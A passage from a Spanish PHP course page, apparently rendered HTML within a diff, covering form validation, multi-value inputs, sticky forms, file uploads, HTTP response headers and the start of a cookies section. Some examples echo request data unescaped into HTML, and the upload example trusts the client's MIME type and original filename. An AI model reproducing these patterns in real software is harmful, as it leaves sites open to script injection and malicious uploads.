+<span class="linenos" data-linenos=" 7 "></span>        <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;modulosDWES&quot;</span><span class="p">&gt;</span>Desarrollo web en entorno servidor<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 8 "></span>    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 9 "></span>
+<span class="linenos" data-linenos="10 "></span>    <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;checkbox&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;modulos[]&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;modulosDWEC&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;DWEC&quot;</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="11 "></span>        <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;modulosDWEC&quot;</span><span class="p">&gt;</span>Desarrollo web en entorno cliente<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="12 "></span>    <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="13 "></span>
+<span class="linenos" data-linenos="14 "></span>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Enviar&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;enviar&quot;</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="15 "></span><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<h3 id="validacion">Validación<a class="headerlink" href="#validacion" title="Permanent link">&para;</a></h3>
+<p>Respecto a la validación, es conveniente siempre hacer <strong>validación doble</strong>:</p>
+<ul>
+<li>En el cliente mediante JS.</li>
+<li>En el servidor es conveniente volver a validar los datos antes de utilizarlos.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;parametro&quot;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="linenos" data-linenos="3 "></span>    <span class="nv">$par </span><span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;parametro&quot;</span><span class="p">];</span>
+<span class="linenos" data-linenos="4 "></span>    <span class="c1">// comprobar si $par tiene el formato adecuado, su valor, etc...</span>
+<span class="linenos" data-linenos="5 "></span><span class="p">}</span>
+</code></pre></div>
+<div class="admonition info">
+<p class="admonition-title">Librerías de validación</p>
+<p>Existen diversas librerías que facilitan la validación de los formularios, como son <a href="https://respect-validation.readthedocs.io/en/latest/">respect/validation</a> o <a href="http://validator.particle-php.com/en/latest/">particle/validator</a>.</p>
+<p>Cuando estudiemos Laravel profundizaremos en la validación de forma declarativa.</p>
+<p>Mientras, recuerda que tienes funciones como <em>gettype</em> que devuelve el tipo de dato y otras como <em>is_int</em>, <em>is_float</em>, <em>is_string</em>, <em>is_array</em>, <em>is_object</em>, que devuelven un booleano a partir del tipo recibido.</p>
+</div>
+<h3 id="parametro-multivalor">Parámetro multivalor<a class="headerlink" href="#parametro-multivalor" title="Permanent link">&para;</a></h3>
+<p>Existen elementos HTML que envían varios valores:</p>
+<ul>
+<li><code>select multiple</code></li>
+<li><code>checkbox</code></li>
+</ul>
+<p>Para recoger los datos, el nombre del elemento debe ser un array. Esto también funciona con otro tipo de inputs, como los de texto, para recoger así todos los valores en un mismo array.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="p">&lt;</span><span class="nt">select</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;lenguajes[]&quot;</span> <span class="na">multiple</span><span class="o">=</span><span class="s">&quot;true&quot;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 2 "></span>    <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;c&quot;</span><span class="p">&gt;</span>C<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 3 "></span>    <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;java&quot;</span><span class="p">&gt;</span>Java<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 4 "></span>    <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;php&quot;</span><span class="p">&gt;</span>PHP<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 5 "></span>    <span class="p">&lt;</span><span class="nt">option</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;python&quot;</span><span class="p">&gt;</span>Python<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 6 "></span><span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos=" 7 "></span>
+<span class="linenos" data-linenos=" 8 "></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;checkbox&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;lenguajes[]&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;c&quot;</span> <span class="p">/&gt;</span> C<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos=" 9 "></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;checkbox&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;lenguajes[]&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;java&quot;</span> <span class="p">/&gt;</span> Java<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="10 "></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;checkbox&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;lenguajes[]&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;php&quot;</span> <span class="p">/&gt;</span> Php<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="11 "></span><span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;checkbox&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;lenguajes[]&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;python&quot;</span> <span class="p">/&gt;</span> Python<span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+</code></pre></div>
+<p>De manera que luego al recoger los datos:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span><span class="nv">$lenguajes</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s2">&quot;lenguajes&quot;</span><span class="p">];</span>
+<span class="linenos" data-linenos="3 "></span>
+<span class="linenos" data-linenos="4 "></span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$lenguajes</span> <span class="k">as</span> <span class="nv">$lenguaje</span><span class="p">)</span> <span class="p">{</span>
+<span class="linenos" data-linenos="5 "></span>    <span class="k">echo</span> <span class="s2">&quot;</span><span class="si">$lenguaje</span><span class="s2"> &lt;br /&gt;&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos="6 "></span><span class="p">}</span>
+</code></pre></div>
+<h3 id="volver-a-rellenar-un-formulario">Volver a rellenar un formulario<a class="headerlink" href="#volver-a-rellenar-un-formulario" title="Permanent link">&para;</a></h3>
+<p>Si no pasa la validación y el usuario tiene que volver a rellenar el formulario, lo ideal es mantener los campos correctos con la información que rellenó. Esta técnica recibe el nombre de <em>sticky form</em>: un formulario que recuerda sus valores. Para ello, hemos de rellenar los atributos <code>value</code> de los elementos HTML con la información que contenían:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;modulos&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nombre&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 3 "></span>  <span class="c1">// Aquí se incluye el código a ejecutar cuando los datos son correctos</span>
+<span class="linenos" data-linenos=" 4 "></span><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 5 "></span>  <span class="c1">// Generamos el formulario</span>
+<span class="linenos" data-linenos=" 6 "></span>  <span class="nv">$nombre</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;nombre&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
+<span class="linenos" data-linenos=" 7 "></span>  <span class="nv">$modulos</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;modulos&#39;</span><span class="p">]</span> <span class="o">??</span> <span class="p">[];</span>
+<span class="linenos" data-linenos=" 8 "></span>  <span class="cp">?&gt;</span>
+<span class="linenos" data-linenos=" 9 "></span>  <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span><span class="cp">?&gt;</span><span class="s">&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="10 "></span>   <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;nombre&quot;</span><span class="p">&gt;</span>Nombre del alumno:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="11 "></span>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;nombre&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;nombre&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;</span><span class="cp">&lt;?</span><span class="o">=</span> <span class="nv">$nombre</span> <span class="cp">?&gt;</span><span class="s">&quot;</span> <span class="p">/&gt;</span> 
+<span class="linenos" data-linenos="12 "></span>   <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="13 "></span>   <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;checkbox&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;modulos[]&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;modulosDWES&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;DWES&quot;</span>
+<span class="linenos" data-linenos="14 "></span>    <span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;DWES&quot;</span><span class="p">,</span><span class="nv">$modulos</span><span class="p">))</span> <span class="k">echo</span> <span class="s1">&#39;checked=&quot;checked&quot;&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="15 "></span>    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;modulosDWES&quot;</span><span class="p">&gt;</span>Desarrollo web en entorno servidor<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="16 "></span>   <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="17 "></span>   <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;checkbox&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;modulos[]&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;modulosDWEC&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;DWEC&quot;</span>
+<span class="linenos" data-linenos="18 "></span>    <span class="cp">&lt;?php</span> <span class="k">if</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="s2">&quot;DWEC&quot;</span><span class="p">,</span><span class="nv">$modulos</span><span class="p">))</span> <span class="k">echo</span> <span class="s1">&#39;checked=&quot;checked&quot;&#39;</span><span class="p">;</span> <span class="cp">?&gt;</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="19 "></span>    <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;modulosDWEC&quot;</span><span class="p">&gt;</span>Desarrollo web en entorno cliente<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="20 "></span>   <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="21 "></span>   <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Enviar&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;enviar&quot;</span><span class="p">/&gt;</span>
+<span class="linenos" data-linenos="22 "></span>  <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="23 "></span><span class="cp">&lt;?php</span> <span class="p">}</span> <span class="cp">?&gt;</span>
+</code></pre></div>
+<h3 id="subir-archivos">Subir archivos<a class="headerlink" href="#subir-archivos" title="Permanent link">&para;</a></h3>
+<p>Cuando subamos archivos a través de un formulario es imprescindible utilizar utilizar los atributos <code>method="POST"</code> y <code>enctype="multipart/form-data"</code>.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="p">&lt;</span><span class="nt">form</span> <span class="na">enctype</span><span class="o">=</span><span class="s">&quot;multipart/form-data&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]; ?&gt;&quot;</span><span class="p">&gt;</span>
+<span class="linenos" data-linenos="2 "></span>    Archivo: <span class="p">&lt;</span><span class="nt">input</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;archivoEnviado&quot;</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;file&quot;</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="3 "></span>    <span class="p">&lt;</span><span class="nt">br</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="4 "></span>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;btnSubir&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Subir&quot;</span> <span class="p">/&gt;</span>
+<span class="linenos" data-linenos="5 "></span><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</code></pre></div>
+<p>Configuración en <code>php.ini</code></p>
+<ul>
+<li><code>file_uploads</code>: on / off</li>
+<li><code>upload_max_filesize</code>: 2M</li>
+<li><code>upload_tmp_dir</code>: directorio temporal. No es necesario configurarlo, cogerá el predeterminado del sistema</li>
+<li><code>post_max_size</code>: tamaño máximo de los datos POST. Debe ser mayor a upload_max_filesize.</li>
+<li><code>max_file_uploads</code>: número máximo de archivos que se pueden cargar a la vez.</li>
+<li><code>max_input_time</code>: tiempo máximo empleado en la carga (GET/POST y upload → normalmente se configura en 60)</li>
+<li><code>memory_limit</code>: 128M</li>
+<li><code>max_execution_time</code>: tiempo de ejecución de un script (no tiene en cuenta el upload)</li>
+</ul>
+<div class="admonition info">
+<p class="admonition-title">Consultar las directivas del php.ini</p>
+<p>Mediante la función <a href="https://www.php.net/manual/en/function.ini-get.php">ini_get</a> podemos obtener el valor de cualquiera directiva del fichero <code>php.ini</code>. Por ejemplo, para consultar cuál es el directorio temporal al que se suben los archivos bastaría con: <code>echo ini_get("upload_tmp_dir");</code>.</p>
+<p>Y mediante <a href="https://www.php.net/manual/en/function.ini-set.php">ini_set</a> podemos modificarlas para que tenga efecto su nuevo valor durante la ejecución del script actual. Después volverán al valor del fichero <code>php.ini</code>. Por ejemplo: <code>ini_set("upload_tmp_dir", "/uploads")</code>.</p>
+</div>
+<p>Una vez enviado el formulario, el proceso es siempre el mismo:</p>
+<ol>
+<li>Comprobar que el archivo se ha subido correctamente.</li>
+<li>Validar el archivo (tipo, tamaño...).</li>
+<li>Crear ruta destino y nombre de archivo según nuestros intereses (utilizar id del usuario, código único...).</li>
+<li>Mover el archivo del directorio temporal a la ruta de destino.</li>
+</ol>
+<p>Para todo ello, podemos acceder a la información de los archivos subidos desde el array asociativo <code>$_FILES</code>. A cada archivo se accede por clave &rarr; el nombre que se le dió en su atributo <code>name</code> del input. Y a su vez, para cada archivo se tiene:</p>
+<ul>
+<li><code>name</code>: nombre</li>
+<li><code>tmp_name</code>: ruta temporal</li>
+<li><code>size</code>: tamaño en bytes</li>
+<li><code>type</code>: <a href="https://developer.mozilla.org/es/docs/Web/HTTP/Guides/MIME_types/Common_types">tipo MIME</a> </li>
+<li><code>error</code>: si hay error, contiene un mensaje. Si ok → 0.</li>
+</ul>
+<p>Ejemplo de cómo procesar un archivo subido al sevidor:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;btnSubir&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 3 "></span>
+<span class="linenos" data-linenos=" 4 "></span>    <span class="c1">// 1. Comprobar que el archivo se sube correctamente</span>
+<span class="linenos" data-linenos=" 5 "></span>    <span class="k">if</span> <span class="p">(</span><span class="nb">is_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;archivoEnviado&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]))</span> <span class="p">{</span>
+<span class="linenos" data-linenos=" 6 "></span>
+<span class="linenos" data-linenos=" 7 "></span>        <span class="c1">// 2. Realizar validación</span>
+<span class="linenos" data-linenos=" 8 "></span>        <span class="k">if</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;archivoEnviado&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;image/jpeg&quot;</span><span class="p">){</span>
+<span class="linenos" data-linenos=" 9 "></span>
+<span class="linenos" data-linenos="10 "></span>            <span class="c1">// 3. Crear ruta destino con nombre, en este caso el original</span>
+<span class="linenos" data-linenos="11 "></span>            <span class="nv">$destino</span> <span class="o">=</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s2">&quot;/uploads/&quot;</span> <span class="o">.</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;archivoEnviado&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> 
+<span class="linenos" data-linenos="12 "></span>            <span class="c1">// __DIR__ es una constante mágica de PHP que devuelve la ruta absoluta del directorio donde se encuentra el archivo PHP que se está ejecutando</span>
+<span class="linenos" data-linenos="13 "></span>            <span class="c1">// $destino = &quot;./uploads/&quot; . $_FILES[&#39;archivoEnviado&#39;][&#39;name&#39;]; // Alternativa mediante ruta relativa</span>
+<span class="linenos" data-linenos="14 "></span>
+<span class="linenos" data-linenos="15 "></span>            <span class="c1">// 4. Mover el archivo del directorio temporal al definitivo</span>
+<span class="linenos" data-linenos="16 "></span>            <span class="nv">$tmp</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;archivoEnviado&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
+<span class="linenos" data-linenos="17 "></span>            <span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$tmp</span><span class="p">,</span> <span class="nv">$destino</span><span class="p">);</span>
+<span class="linenos" data-linenos="18 "></span>        <span class="p">}</span>
+<span class="linenos" data-linenos="19 "></span>    <span class="p">}</span>
+<span class="linenos" data-linenos="20 "></span><span class="p">}</span>
+</code></pre></div>
+<div class="admonition danger">
+<p class="admonition-title">Permisos en ruta destino</p>
+<p>Muy importante, la carpeta destino de los archivos subidos ('uploads' en el ejemplo anterior), tiene que tener <strong>permisos de escritura</strong> para que el servidor web pueda mover los archivos a él.</p>
+</div>
+<div class="admonition info">
+<p class="admonition-title">Obtener extensión del fichero</p>
+<p>Mediante la función <a href="https://www.php.net/manual/en/function.pathinfo.php">pathinfo</a> se obtiene un array con información del fichero. Entre ellos, la extensión del mismo.</p>
+</div>
+<h2 id="43-cabeceras-de-respuesta">4.3 Cabeceras de respuesta<a class="headerlink" href="#43-cabeceras-de-respuesta" title="Permanent link">&para;</a></h2>
+<p>Las cabeceras de respuesta (HTTP Response Headers) son información que el servidor envía al navegador (o cliente HTTP) antes del contenido de la página. Sirven para indicar metadatos sobre la respuesta: tipo de contenido, estado, cookies, control de caché, redirecciones, seguridad, etc.</p>
+<p>En otras palabras, <em>permiten que el navegador sepa cómo interpretar y manejar la respuesta antes de mostrarla</em>.</p>
+<table>
+<thead>
+<tr>
+<th>Función</th>
+<th>Descripción</th>
+<th>Ejemplo</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Tipo de contenido</td>
+<td>Indicar qué tipo de datos se envían</td>
+<td><code>Content-Type: text/html</code></td>
+</tr>
+<tr>
+<td>Estado de la respuesta</td>
+<td>Informar si la solicitud fue correcta o no</td>
+<td><code>HTTP/1.1 404 Not Found</code></td>
+</tr>
+<tr>
+<td>Control de caché</td>
+<td>Indicar si el navegador o proxies pueden guardar la respuesta</td>
+<td><code>Cache-Control: no-cache</code></td>
+</tr>
+<tr>
+<td>Cookies y sesiones</td>
+<td>Enviar cookies al cliente</td>
+<td><code>Set-Cookie: PHPSESSID=...</code></td>
+</tr>
+<tr>
+<td>Seguridad</td>
+<td>Protección frente a ataques web evitando que se carguen webs en un iframe</td>
+<td><code>X-Frame-Options: DENY</code></td>
+</tr>
+<tr>
+<td>Redirección</td>
+<td>Enviar al cliente a otro recurso</td>
+<td><code>Location: https://example.com</code></td>
+</tr>
+<tr>
+<td>CORS</td>
+<td>Permitir o restringir acceso entre dominios</td>
+<td><code>Access-Control-Allow-Origin: *</code></td>
+</tr>
+</tbody>
+</table>
+<p>Debe ser lo primero a devolver y lo haremos mediante la función <code>header(cadena)</code>. Mediante las cabeceras podemos configurar el tipo de contenido, tiempo de expiración, redireccionar el navegador, especificar errores HTTP, etc.</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span> <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Content-Type: text/plain&quot;</span><span class="p">);</span> <span class="cp">?&gt;</span>
+<span class="linenos" data-linenos="2 "></span><span class="cp">&lt;?php</span> <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: http://www.ejemplo.com/inicio.html&quot;</span><span class="p">);</span>
+<span class="linenos" data-linenos="3 "></span><span class="k">exit</span><span class="p">();</span> 
+</code></pre></div>
+<p>Se puede comprobar en las herramientas del desarrollador de los navegadores web mediante <em>Dev Tools &rarr; Red &rarr; clic en el nombre del archivo &rarr; Encabezados</em>.</p>
+<p>Es muy común configurar las cabeceras para evitar consultas a la caché o provocar su renovación:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos="1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos="2 "></span><span class="c1">// No permitir que el recurso se almacene en caché (indicando fecha pasada)</span>
+<span class="linenos" data-linenos="3 "></span><span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: no-cache, must-revalidate&quot;</span><span class="p">);</span>
+<span class="linenos" data-linenos="4 "></span><span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: Sat, 26 Jul 1997 05:00:00 GMT&quot;</span><span class="p">);</span>
+<span class="linenos" data-linenos="5 "></span>
+<span class="linenos" data-linenos="6 "></span><span class="c1">// Permitir caché durante 1 hora (3600 segundos)</span>
+<span class="linenos" data-linenos="7 "></span><span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: max-age=3600, public&quot;</span><span class="p">);</span>
+<span class="linenos" data-linenos="8 "></span><span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: &quot;</span> <span class="o">.</span> <span class="nb">gmdate</span><span class="p">(</span><span class="s2">&quot;D, d M Y H:i:s&quot;</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot; GMT&quot;</span><span class="p">);</span>
+</code></pre></div>
+<div class="admonition tip">
+<p class="admonition-title">Recargar para probar caché</p>
+<p>A la hora de realizar pruebas para ver si una página es cacheada o no, realiza la recarga directamente desde la barra de direcciones del navegador o pulsando un botón que te lleve a dicho recurso, en lugar de pulsar el botón de recarga del navegador, el cual va a solicitar siempre el recurso fuera de caché.</p>
+</div>
+<h2 id="44-gestion-del-estado">4.4 Gestión del estado<a class="headerlink" href="#44-gestion-del-estado" title="Permanent link">&para;</a></h2>
+<p>HTTP es un protocolo <em>stateless</em>, sin estado. Por ello, se simula el estado mediante el uso de cookies, tokens o la sesión. El estado es necesario para procesos tales como el carrito de la compra, operaciones asociadas a un usuario, etc...
+El mecanismo de PHP para gestionar la sesión emplea cookies de forma interna.
+<em>Las cookies se almacenan en el navegador del cliente, y la sesión en el servidor web</em>.</p>
+<h3 id="cookies">Cookies<a class="headerlink" href="#cookies" title="Permanent link">&para;</a></h3>
+<p>Las cookies son pequeños archivos de datos que un sitio web almacena en el navegador del usuario para recordar información, como inicios de sesión o preferencias. Estas cookies se crean generalmente mediante encabezados HTTP como <code>Set-Cookie</code> (desde el servidor) o a través de JavaScript con <code>document.cookie</code>. </p>
+<p>Entre otros, podemos usarlas para:</p>
+<ul>
+<li>Recordar los inicios de sesión.</li>
+<li>Almacenar valores temporales de usuario.</li>
+<li>Si un usuario está navegando por una lista paginada de artículos, ordenados de cierta manera, podemos almacenar el ajuste de la clasificación.</li>
+</ul>
+<figure style="align: center;">
+    <img src="imagenes/04/04cookies.png" width="700">
+    <figcaption>Comunicación con cookies</figcaption>
+</figure>
+
+<p>Las cookies se almacenan en el array global <code>$_COOKIE</code>. Lo que coloquemos dentro del array, <strong>se guardará en el cliente</strong>. Hay que tener presente que el cliente puede no querer almacenarlas. </p>
+<p>Existe una limitación de 20 cookies por dominio y 300 en total en el navegador.</p>
+<p>En PHP creamos una cookie, que se enviará con el resto de encabezados HTTP, mediante la función <code>setcookie</code>:</p>
+<div class="highlight"><pre><span></span><code><span class="linenos" data-linenos=" 1 "></span><span class="cp">&lt;?php</span>
+<span class="linenos" data-linenos=" 2 "></span>    <span class="nb">setcookie</span><span class="p">(</span>
+<span class="linenos" data-linenos=" 3 "></span>        <span class="nx">string</span> <span class="nv">$name</span><span class="p">,</span>
+<span class="linenos" data-linenos=" 4 "></span>        <span class="nx">string</span> <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="linenos" data-linenos=" 5 "></span>        <span class="nx">int</span> <span class="nv">$expires_or_options</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+<span class="linenos" data-linenos=" 6 "></span>        <span class="nx">string</span> <span class="nv">$path</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="linenos" data-linenos=" 7 "></span>        <span class="nx">string</span> <span class="nv">$domain</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">,</span>
+<span class="linenos" data-linenos=" 8 "></span>        <span class="nx">bool</span> <span class="nv">$secure</span> <span class="o">=</span> <span class="k">false</span><span class="p">,</span>
+<span class="linenos" data-linenos=" 9 "></span>        <span class="nx">bool</span> <span class="nv">$httponly</span> <span class="o">=</span> <span class="k">false</span>
+<span class="linenos" data-linenos="10 "></span>    <span class="p">)</span><span class="o">:</span> <span class="nx">bool</span>
+<span class="linenos" data-linenos="11 "></span>
+<span class="linenos" data-linenos="12 "></span>    <span class="c1">// Firma alternativa a partir de PHP 7.3</span>
